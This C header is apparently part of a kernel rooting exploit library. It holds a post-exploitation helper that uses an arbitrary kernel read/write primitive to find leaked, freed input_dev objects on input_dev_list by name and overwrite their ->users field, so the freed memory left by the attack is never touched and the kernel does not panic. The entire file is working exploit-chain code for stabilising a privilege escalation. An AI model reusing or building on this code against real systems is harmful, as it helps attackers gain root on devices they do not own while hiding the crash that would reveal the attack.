/* lib/root/input_neut.h -- neutralise leaked input_dev objects so that a later
 * open of the (freed) device short-circuits before ->open is ever called.
 *
 * A driver that frees an input_dev while its evdev char node stays registered
 * leaves any process that opens that node walking freed memory inside ->open
 * (e.g. a dangling wait queue), which panics the kernel. input_open_device
 * returns early when input_dev->users is already non-zero (source-verified), so
 * setting ->users != 0 makes every later open skip ->open and never enter the
 * freed device. Given a kernel read/write, this finds the leaked devices by name
 * on input_dev_list and sets their ->users, then reads them back to confirm.
 *
 * Only ->users is touched; the freed object is otherwise left alone (patching
 * its other fields is whack-a-mole -- the fatal path is the open, and this
 * closes it). All offsets are the caller's (they are per-kernel).
 */
#ifndef LIB_INPUT_NEUT_H
#define LIB_INPUT_NEUT_H

#include "../rw/krw.h"
#include "input_dev_find.h"

/* Set ->users=1 on each of `nd` input_dev addresses through `rw`, then read them
 * back. Two idempotent passes: a krw write issued right after an unrelated write
 * can be consumed settling the primitive's state, so the second pass lands it.
 * Returns how many read back non-zero. */
static inline int lib_neut_write_users(const struct krw *rw,
		const unsigned long long *idev, int nd, unsigned users_off)
{
	unsigned int one = 1;
	for (int pass = 0; pass < 2; pass++)
		for (int k = 0; k < nd; k++)
			krw_write(rw, k_direct_raw(idev[k] + users_off), &one, sizeof one);
	int ok = 0;
	for (int k = 0; k < nd; k++) {
		unsigned long long u = 0;
		if (krw_read(rw, k_direct_raw(idev[k] + users_off), &u, 8) &&
		    (u & 0xffffffffULL))
			ok++;
	}
	return ok;
}

/* Find every leaked input_dev whose name starts with `prefix` on the
 * input_dev_list at `list_head` (via lib_input_dev_find_by_name) and neutralise
 * it through `rw`. Returns the number confirmed; *found_out, when non-NULL,
 * receives how many were found. For callers that hold their own reader for the
 * list walk; callers that receive the addresses another way (a root oracle over
 * IPC) use lib_neut_write_users directly. */
static inline int lib_neut_find_and_write(const struct krw *rw,
		unsigned long long list_head, unsigned node_off, unsigned name_off,
		unsigned users_off, const char *prefix, int max, int *found_out)
{
	unsigned long long idev[64];
	if (max > 64)
		max = 64;
	int nd = list_head ? lib_input_dev_find_by_name(list_head, node_off, name_off,
							prefix, idev, max) : 0;
	if (found_out)
		*found_out = nd;
	return lib_neut_write_users(rw, idev, nd, users_off);
}

#endif /* LIB_INPUT_NEUT_H */
